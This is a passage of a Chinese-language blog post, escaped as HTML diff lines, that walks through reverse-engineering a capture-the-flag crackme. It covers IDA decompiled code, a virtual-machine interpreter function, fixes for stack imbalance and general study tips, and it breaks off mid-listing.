+&lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption data-lang=&#34;c&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; v4&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;117&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;// [esp+18h] [ebp-1D4h] BYREF&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;ul&gt;
+&lt;li&gt;声明了一个包含 117 个整数的数组  &lt;code&gt;v4&lt;/code&gt; 。&lt;/li&gt;
+&lt;li&gt;注释指出了栈偏移量，表示  &lt;code&gt;v4&lt;/code&gt;  位于栈帧的  &lt;code&gt;[ebp - 0x1D4]&lt;/code&gt;  位置。&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;BYREF&lt;/code&gt;  表示该变量以引用方式传递给函数。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;调用  &lt;code&gt;__main()&lt;/code&gt; ：&lt;/strong&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption data-lang=&#34;c&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;__main&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;ul&gt;
+&lt;li&gt;这是编译器（如 GCC）在初始化时调用的函数，用于设置全局构造函数等。&lt;/li&gt;
+&lt;li&gt;在逆向工程中，它通常可以忽略，对主要逻辑影响不大。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;调用  &lt;code&gt;qmemcpy()&lt;/code&gt; ：&lt;/strong&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption data-lang=&#34;c&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;qmemcpy&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;v4&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;&amp;amp;&lt;/span&gt;unk_403040&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0x1C8u&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;ul&gt;
+&lt;li&gt;将内存从  &lt;code&gt;&amp;amp;unk_403040&lt;/code&gt;  复制到  &lt;code&gt;v4&lt;/code&gt; ，长度为  &lt;code&gt;0x1C8&lt;/code&gt;  字节（456 字节）。&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;qmemcpy&lt;/code&gt;  类似于标准的  &lt;code&gt;memcpy&lt;/code&gt; ，但可能是 IDA Pro 的内部函数。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;调用  &lt;code&gt;vm_operad()&lt;/code&gt; ：&lt;/strong&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption data-lang=&#34;c&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;vm_operad&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;v4&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;114&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;ul&gt;
+&lt;li&gt;调用函数  &lt;code&gt;vm_operad&lt;/code&gt; ，传入参数  &lt;code&gt;v4&lt;/code&gt;  和  &lt;code&gt;114&lt;/code&gt; 。&lt;/li&gt;
+&lt;li&gt;这里的  &lt;code&gt;114&lt;/code&gt;  可能表示操作码的数量、数据长度或某个关键值。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;输出信息：&lt;/strong&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption data-lang=&#34;c&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;puts&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;good,The answer format is:flag &amp;#123;&amp;#125;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;ul&gt;
+&lt;li&gt;输出提示信息，告诉我们答案的格式是  &lt;code&gt;flag &amp;#123;&amp;#125;&lt;/code&gt; 。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;返回语句：&lt;/strong&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption data-lang=&#34;c&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;ul&gt;
+&lt;li&gt;标准的  &lt;code&gt;main&lt;/code&gt;  函数返回，表示程序正常结束。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;hr /&gt;
+&lt;h3 id=&#34;深入分析&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#深入分析&#34;&gt;#&lt;/a&gt; &lt;strong&gt;深入分析：&lt;/strong&gt;&lt;/h3&gt;
+&lt;h4 id=&#34;1-理解数据复制操作&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1-理解数据复制操作&#34;&gt;#&lt;/a&gt; &lt;strong&gt;1. 理解数据复制操作：&lt;/strong&gt;&lt;/h4&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;数据源  &lt;code&gt;unk_403040&lt;/code&gt; ：&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;unk_403040&lt;/code&gt;  是未知的全局数据，位于地址  &lt;code&gt;0x403040&lt;/code&gt; 。&lt;/li&gt;
+&lt;li&gt;我们需要查看该地址处的数据内容，可能是加密的数据、字节码、操作码等。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;复制操作：&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;将  &lt;code&gt;456&lt;/code&gt;  字节的数据复制到  &lt;code&gt;v4&lt;/code&gt; 。&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;v4&lt;/code&gt;  的大小为  &lt;code&gt;117 * 4 = 468&lt;/code&gt;  字节（因为每个  &lt;code&gt;int&lt;/code&gt;  是 4 字节），所以复制操作是安全的。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4 id=&#34;2-分析-vm_operad-函数&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2-分析-vm_operad-函数&#34;&gt;#&lt;/a&gt; &lt;strong&gt;2. 分析  &lt;code&gt;vm_operad()&lt;/code&gt;  函数：&lt;/strong&gt;&lt;/h4&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;函数作用猜测：&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;从函数名来看， &lt;code&gt;vm_operad&lt;/code&gt;  可能表示 “虚拟机操作”。&lt;/li&gt;
+&lt;li&gt;这暗示该函数可能是一个虚拟机解释器，执行传入的字节码或操作码。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;参数  &lt;code&gt;114&lt;/code&gt;  的含义：&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;114&lt;/code&gt;  可能表示操作码的数量或某个关键参数。&lt;/li&gt;
+&lt;li&gt;可能与复制的数据长度或某种校验有关。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4 id=&#34;3-反汇编-vm_operad&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#3-反汇编-vm_operad&#34;&gt;#&lt;/a&gt; &lt;strong&gt;3. 反汇编  &lt;code&gt;vm_operad()&lt;/code&gt; ：&lt;/strong&gt;&lt;/h4&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;步骤：&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;在 IDA 中，定位并反汇编  &lt;code&gt;vm_operad&lt;/code&gt; 。&lt;/li&gt;
+&lt;li&gt;分析函数的控制流程，查看是否有循环、跳转表或条件判断。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;寻找模式：&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;操作码解析：&lt;/strong&gt; 检查是否有读取  &lt;code&gt;v4&lt;/code&gt;  中数据作为操作码的逻辑。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;栈操作：&lt;/strong&gt; 查看是否有自定义的栈，用于模拟指令执行。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;关键函数调用：&lt;/strong&gt; 寻找与字符串比较、加密解密、输出相关的函数调用。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4 id=&#34;4-堆栈不平衡问题的原因&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#4-堆栈不平衡问题的原因&#34;&gt;#&lt;/a&gt; &lt;strong&gt;4. 堆栈不平衡问题的原因：&lt;/strong&gt;&lt;/h4&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;异常的栈操作：&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;如果  &lt;code&gt;vm_operad&lt;/code&gt;  在执行过程中直接修改了栈指针（如  &lt;code&gt;ESP&lt;/code&gt;  寄存器），会导致 IDA 无法正确跟踪栈帧，出现堆栈不平衡的提示。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;解决方法：&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;手动调整：&lt;/strong&gt; 在 IDA 中，可以手动修改栈平衡，在函数属性中调整栈偏移。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;分析调用约定：&lt;/strong&gt; 确保函数的入口和出口栈平衡，即进入和离开函数时，栈指针应恢复到相同的值。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4 id=&#34;5-修改-call-指令的值为-0-的意义&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#5-修改-call-指令的值为-0-的意义&#34;&gt;#&lt;/a&gt; &lt;strong&gt;5. 修改  &lt;code&gt;call&lt;/code&gt;  指令的值为  &lt;code&gt;0&lt;/code&gt;  的意义：&lt;/strong&gt;&lt;/h4&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;跳过函数调用：&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;将  &lt;code&gt;call&lt;/code&gt;  指令的目标地址修改为  &lt;code&gt;0&lt;/code&gt; ，相当于调用了一个空函数，可能会导致程序崩溃或无操作返回。&lt;/li&gt;
+&lt;li&gt;在逆向过程中，这种修改用于跳过某些干扰性的函数，如反调试、反虚拟化或延时函数。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;保持栈平衡：&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;即使修改了  &lt;code&gt;call&lt;/code&gt; ，也需要确保栈的平衡。&lt;/li&gt;
+&lt;li&gt;可以用  &lt;code&gt;NOP&lt;/code&gt;  指令替换  &lt;code&gt;call&lt;/code&gt; ，或者调整栈指针，使得程序继续正常执行。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr /&gt;
+&lt;h3 id=&#34;可视化结构图&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#可视化结构图&#34;&gt;#&lt;/a&gt; &lt;strong&gt;可视化结构图：&lt;/strong&gt;&lt;/h3&gt;
+&lt;h4 id=&#34;函数调用栈&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#函数调用栈&#34;&gt;#&lt;/a&gt; &lt;strong&gt;函数调用栈：&lt;/strong&gt;&lt;/h4&gt;
+&lt;pre&gt;&lt;code&gt;[ 高地址 ]
++-----------------------+
+| 命令行参数 envp       |
++-----------------------+
+| 命令行参数 argv       |
++-----------------------+
+| 参数个数 argc         |
++-----------------------+
+| 返回地址              | &amp;lt;-- 调用 __main() 压入的返回地址
++-----------------------+
+| 返回地址              | &amp;lt;-- 调用 main() 压入的返回地址
++-----------------------+
+| 旧的 EBP              | &amp;lt;-- 基指针 EBP
++-----------------------+
+| 局部变量 v4[117]      | &amp;lt;-- 栈帧中的变量
++-----------------------+
+[ 低地址 ]
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h4 id=&#34;程序执行流程&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#程序执行流程&#34;&gt;#&lt;/a&gt; &lt;strong&gt;程序执行流程：&lt;/strong&gt;&lt;/h4&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;开始执行  &lt;code&gt;main()&lt;/code&gt; &lt;/strong&gt;。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;调用  &lt;code&gt;__main()&lt;/code&gt; &lt;/strong&gt;：初始化操作。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;数据复制&lt;/strong&gt;：将数据从  &lt;code&gt;unk_403040&lt;/code&gt;  复制到  &lt;code&gt;v4&lt;/code&gt; 。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;执行  &lt;code&gt;vm_operad(v4, 114)&lt;/code&gt; &lt;/strong&gt;：
+&lt;ul&gt;
+&lt;li&gt;可能解释执行  &lt;code&gt;v4&lt;/code&gt;  中的数据。&lt;/li&gt;
+&lt;li&gt;关键的逻辑可能在此函数中。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;输出提示信息&lt;/strong&gt;：告诉我们答案的格式。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;程序结束&lt;/strong&gt;：返回  &lt;code&gt;0&lt;/code&gt; 。&lt;/li&gt;
+&lt;/ol&gt;
+&lt;hr /&gt;
+&lt;h3 id=&#34;成为逆向大师的指导&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#成为逆向大师的指导&#34;&gt;#&lt;/a&gt; &lt;strong&gt;成为逆向大师的指导：&lt;/strong&gt;&lt;/h3&gt;
+&lt;h4 id=&#34;1-深入分析-unk_403040&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1-深入分析-unk_403040&#34;&gt;#&lt;/a&gt; &lt;strong&gt;1. 深入分析  &lt;code&gt;unk_403040&lt;/code&gt; ：&lt;/strong&gt;&lt;/h4&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;查看数据内容：&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;在 IDA 中，跳转到地址  &lt;code&gt;0x403040&lt;/code&gt; ，查看数据是否为可读字符串、操作码或其他格式。&lt;/li&gt;
+&lt;li&gt;如果是字节码，尝试手动解析。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;数据模式识别：&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;检查是否有明显的加密或混淆迹象。&lt;/li&gt;
+&lt;li&gt;如果数据不可读，可能需要解密或解码。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4 id=&#34;2-解析-vm_operad-的逻辑&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2-解析-vm_operad-的逻辑&#34;&gt;#&lt;/a&gt; &lt;strong&gt;2. 解析  &lt;code&gt;vm_operad()&lt;/code&gt;  的逻辑：&lt;/strong&gt;&lt;/h4&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;反汇编并注释：&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;逐行反汇编  &lt;code&gt;vm_operad&lt;/code&gt; ，添加注释，理解每个指令的作用。&lt;/li&gt;
+&lt;li&gt;关注寄存器的使用、条件跳转和函数调用。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;构建操作码表：&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;如果  &lt;code&gt;vm_operad&lt;/code&gt;  是解释器，可能有一个操作码对应的指令集。&lt;/li&gt;
+&lt;li&gt;建立操作码与指令的映射，模拟执行过程。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4 id=&#34;3-解决堆栈不平衡&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#3-解决堆栈不平衡&#34;&gt;#&lt;/a&gt; &lt;strong&gt;3. 解决堆栈不平衡：&lt;/strong&gt;&lt;/h4&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;理解栈帧结构：&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;熟悉函数调用约定，如  &lt;code&gt;cdecl&lt;/code&gt; 、 &lt;code&gt;stdcall&lt;/code&gt;  等。&lt;/li&gt;
+&lt;li&gt;理解栈指针（ESP）和基指针（EBP）的变化。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;修正 IDA 中的堆栈信息：&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;使用 IDA 的功能，手动设置函数的栈调整值。&lt;/li&gt;
+&lt;li&gt;在函数属性中，设置正确的输入输出栈大小。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4 id=&#34;4-实践调试技巧&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#4-实践调试技巧&#34;&gt;#&lt;/a&gt; &lt;strong&gt;4. 实践调试技巧：&lt;/strong&gt;&lt;/h4&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;使用调试器：&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;在动态调试器（如 OllyDbg、x64dbg）中运行程序，观察运行时的行为。&lt;/li&gt;
+&lt;li&gt;设置断点，查看寄存器和内存的变化。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;脚本和自动化：&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;利用 IDA Python 编写脚本，自动提取和分析数据。&lt;/li&gt;
+&lt;li&gt;学习使用其他逆向工具，如 Ghidra、Radare2。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4 id=&#34;5-解决逆向挑战&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#5-解决逆向挑战&#34;&gt;#&lt;/a&gt; &lt;strong&gt;5. 解决逆向挑战：&lt;/strong&gt;&lt;/h4&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;寻找密钥或 Flag：&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;关注  &lt;code&gt;vm_operad&lt;/code&gt;  中的比较、循环和条件跳转。&lt;/li&gt;
+&lt;li&gt;可能需要输入特定的数据，或者从  &lt;code&gt;v4&lt;/code&gt;  中提取信息。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;学习常见的加密和编码方式：&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;熟悉 Base64、异或加密、移位加密等常用技巧。&lt;/li&gt;
+&lt;li&gt;了解字符串加密和解密的过程。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr /&gt;
+&lt;h3 id=&#34;总结&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#总结&#34;&gt;#&lt;/a&gt; &lt;strong&gt;总结：&lt;/strong&gt;&lt;/h3&gt;
+&lt;p&gt;通过逐步分析代码，我们了解到：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;程序从全局未知数据  &lt;code&gt;unk_403040&lt;/code&gt;  中复制了一段数据到本地变量  &lt;code&gt;v4&lt;/code&gt; 。&lt;/li&gt;
+&lt;li&gt;通过调用  &lt;code&gt;vm_operad&lt;/code&gt; ，可能对这段数据进行了解析或执行。&lt;/li&gt;
+&lt;li&gt;输出的信息提示我们，答案的格式是  &lt;code&gt;flag &amp;#123;&amp;#125;&lt;/code&gt; 。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;要进一步解开这个逆向题，需要：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;深入分析  &lt;code&gt;vm_operad&lt;/code&gt;  的逻辑，理解其功能。&lt;/li&gt;
+&lt;li&gt;可能需要模拟或重现  &lt;code&gt;vm_operad&lt;/code&gt;  的执行过程。&lt;/li&gt;
+&lt;li&gt;从  &lt;code&gt;v4&lt;/code&gt;  或其他数据中提取出隐藏的  &lt;code&gt;flag&lt;/code&gt; 。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr /&gt;
+&lt;p&gt;&lt;strong&gt;建议：&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;耐心研究&lt;/strong&gt;：逆向工程需要耐心和细致的分析，逐行理解代码。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;多练习&lt;/strong&gt;：通过解决更多的逆向题目，积累经验。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;学习基础&lt;/strong&gt;：巩固计算机体系结构、汇编语言和操作系统的知识。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;交流讨论&lt;/strong&gt;：与他人分享和讨论你的发现，可以获得新的思路。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;希望以上分析对你有所帮助，继续努力，你一定能成为一名出色的逆向工程师！\&lt;/p&gt;
+&lt;p&gt;好的，让我们进一步分析  &lt;code&gt;vm_operad&lt;/code&gt;  函数的具体实现，逐步理解它的逻辑和可能的用途。&lt;/p&gt;
+&lt;h3 id=&#34;代码分析-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#代码分析-2&#34;&gt;#&lt;/a&gt; &lt;strong&gt;代码分析：&lt;/strong&gt;&lt;/h3&gt;
+&lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption data-lang=&#34;c&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; __cdecl &lt;span class=&#34;token function&#34;&gt;vm_operad&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;a1&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; a2&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; result&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;// eax&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token keyword&#34;&gt;char&lt;/span&gt; Str&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;200&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;// [esp+13h] [ebp-E5h] BYREF&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token keyword&#34;&gt;char&lt;/span&gt; v4&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;// [esp+DBh] [ebp-1Dh]&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; v5&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;// [esp+DCh] [ebp-1Ch]&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; v6&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;// [esp+E0h] [ebp-18h]&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; v7&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;// [esp+E4h] [ebp-14h]&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; v8&lt;span 